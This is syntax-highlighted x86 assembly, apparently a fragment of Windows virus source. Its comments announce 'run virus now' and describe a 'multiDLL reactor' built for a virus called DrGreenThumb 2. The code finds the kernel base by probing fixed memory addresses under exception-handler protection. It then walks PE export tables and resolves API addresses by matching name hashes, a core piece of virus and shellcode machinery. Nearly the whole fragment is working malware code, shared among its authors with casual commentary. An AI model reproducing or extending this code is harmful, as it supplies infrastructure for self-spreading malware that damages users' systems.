</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; run virus now</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This is a multiDLL reactor, it comes from the version 2 of the reactor in </span><span class="sc0">
</span><span class="sc1">; arianne, hope you enjoy the code! This is version 3b coz it's specialy</span><span class="sc0">
</span><span class="sc1">; designed for DrGreenThumb 2.  </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Version 3b: Thatsokaynow </span><span class="sc0">
</span><span class="sc1">; Version 3: Multiple DLL scanning</span><span class="sc0">
</span><span class="sc1">;        PseudoImportZone(tm) created</span><span class="sc0">
</span><span class="sc1">;            Minor changes, large instructions revised and redefined structure</span><span class="sc0">
</span><span class="sc1">; Version 2: Uses ZeroCRCs</span><span class="sc0">
</span><span class="sc1">;        Only one loop used</span><span class="sc0">
</span><span class="sc1">;        NT/95/98 compatible</span><span class="sc0">
</span><span class="sc1">;        some bugs fixed, structure change, one loop, time gain</span><span class="sc0">
</span><span class="sc1">; Version 1: First prototype - Pretty small</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">initapi</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; point to the mini </span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">; import</span><span class="sc0">

</span><span class="sc5">dothescanner</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; check if we reached</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">dothescanner</span><span class="sc0">                </span><span class="sc1">; end of mini import</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Thisoffset</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">      </span><span class="sc1">; so this is for fixing</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                   </span><span class="sc1">; a problem of using</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Thisoffset2</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">     </span><span class="sc1">; too much register</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">; for finding apis</span><span class="sc0">
                            </span><span class="sc1">; I should optimizate</span><span class="sc0">
</span><span class="sc5">dothatnow</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">;   ... a day...</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0FFh</span><span class="sc0">         </span><span class="sc1">; we reached end ok...</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">letscontinue</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">letscontinue</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">scannext</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">            </span><span class="sc1">; look for . separating</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">scannext</span><span class="sc0">                </span><span class="sc1">; library names</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; avoid</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">; overwriting</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'lld'</span><span class="sc0">           </span><span class="sc1">; so set dll name</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">stubtest</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; this is for avoiding</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">gotherenow</span><span class="sc0">              </span><span class="sc1">; 1st loop</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LoadLibraryA</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; so we get this api</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">dontinitit</span><span class="sc0">

</span><span class="sc5">gotherenow</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">GetHardKernel</span><span class="sc4">:</span><span class="sc0">                  

</span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">stackrejust</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">     </span><span class="sc1">; we have to save stack</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveSEH</span><span class="sc0">                 </span><span class="sc1">; coz seh crash it</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kntestnext1</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; we fix seh to next</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetSEH</span><span class="sc0">                  </span><span class="sc1">; scan procedure</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">07fe00000h</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">       </span><span class="sc1">; check for win2K kernel but</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">kntestnext1</span><span class="sc0">             </span><span class="sc1">; does it will works anyway ???</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">07fe00000h</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">wefound1</span><span class="sc0">                </span><span class="sc1">; that's okay</span><span class="sc0">

</span><span class="sc5">stackrejust</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">kntestnext1</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kntestnext2</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; set stack to next kernel</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetSEH</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">07ff00000h</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">       </span><span class="sc1">; this should be Nt Kernel</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">kntestnext2</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">07ff00000h</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">wefound1</span><span class="sc0">

</span><span class="sc5">kntestnext2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kntestnext4</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; set SEH to crash procedure</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetSEH</span><span class="sc0">                  </span><span class="sc1">; okay, it's lame coding...</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">0BFF70000h</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">       </span><span class="sc1">; check Win9x kernel</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">kntestnext4</span><span class="sc0">             </span><span class="sc1">; this </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0bff70000h</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">wefound1</span><span class="sc0">

</span><span class="sc5">kntestnext4</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RestoreSEH</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">0BFF70000h</span><span class="sc4">],</span><span class="sc2">500</span><span class="sc0">        </span><span class="sc1">; this program made an </span><span class="sc0">
                        </span><span class="sc1">; exception blablabla</span><span class="sc0">
</span><span class="sc5">wefound1</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RestoreSEH</span><span class="sc0">              </span><span class="sc1">; now we restore the old  SEH</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">stackrejust</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; reajust stack</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; save eax</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">                       </span><span class="sc1">; and reset stack</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">; we got in eax the kernel</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">wefound</span><span class="sc0">                 </span><span class="sc1">; location</span><span class="sc0">

</span><span class="sc5">dontinitit</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LoadLibraryA</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; get apis adress</span><span class="sc0">

</span><span class="sc5">wefound</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">; error, erm bye...</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">itsokay1</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">itsokay1</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; ebx point to the PE header</span><span class="sc0">
                                                </span><span class="sc1">; In fact it's allways PE</span><span class="sc0">
                        </span><span class="sc1">; I skiped the MZ and PE</span><span class="sc0">
                        </span><span class="sc1">; signature check coz if it's</span><span class="sc0">
                        </span><span class="sc1">; not, Kernel can't be loaded :]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">120</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; esi point to the Export</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; zone</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; ecx = number of export</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; ebx point to the name offset</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; table</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc1">;   mov ebp,offset startapis</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0bdh</span><span class="sc0">
</span><span class="sc5">Thisoffset2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0h</span><span class="sc0">

</span><span class="sc5">Scanstring</span><span class="sc4">:</span><span class="sc0">
    

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; edi point to the 1st</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; name</span><span class="sc0">

</span><span class="sc5">loophere</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">               </span><span class="sc1">; we have to search apis</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; by ordinal/names</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; coz NT have some disachronism</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; name in table is not the </span><span class="sc0">
                        </span><span class="sc1">; same that follow each other</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">getnamecrc</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; this is really small crc</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; untill now, I never had </span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">test_crcs</span><span class="sc0">           </span><span class="sc1">; confusion between them</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">               </span><span class="sc1">; a just small nice algorithm</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">getnamecrc</span><span class="sc0">          </span><span class="sc1">; enjoy guys...</span><span class="sc0">

</span><span class="sc5">test_crcs</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">testnext</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; we reached end of list ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">suither</span><span class="sc0">             </span><span class="sc1">; boom biddy byebye</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">testnext</span><span class="sc0">            </span><span class="sc1">; if crc in list = calculated</span><span class="sc0">
                        </span><span class="sc1">; no, then byebye</span><span class="sc0">
</span><span class="sc5">getrva</span><span class="sc4">:</span><span class="sc0"> 

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; we get apis number</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; sub number of loop we done</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">; got in ebx the apis ordin.</span><span class="sc0">
    
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; table RVA</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; Add Rva</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; seems to be okie!</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; </span><span class="sc0">

    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">               </span><span class="sc1">; damn, I forgot the meaning</span><span class="sc0">
                        </span><span class="sc1">; of all that</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; shame on me...</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; we saved it now</span><span class="sc0">

</span><span class="sc1">;   add ebp,offset startlist-startapis</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">081h</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0c5h</span><span class="sc0">
</span><span class="sc5">Thisoffset</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">suither</span><span class="sc4">:</span><span class="sc0">
    
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">loophere</span><span class="sc0">        </span><span class="sc1">; loop until all apis are scanned</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dothatnow</span><span class="sc0">       </span><span class="sc1">; return</span><span class="sc0">

</span><span class="sc5">SaveSEH</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">backup</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; save last SEH</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">RestoreSEH</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">backup</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; restore last SEH</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

